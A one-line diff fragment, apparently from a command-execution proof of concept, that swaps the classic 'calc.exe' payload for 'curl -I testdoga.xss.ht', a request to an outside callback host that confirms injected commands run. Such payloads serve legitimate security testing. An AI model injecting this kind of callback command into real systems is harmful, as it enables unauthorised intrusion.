@@ -1,1 +1,1 @@
-calc.exe
+curl -I testdoga.xss.ht
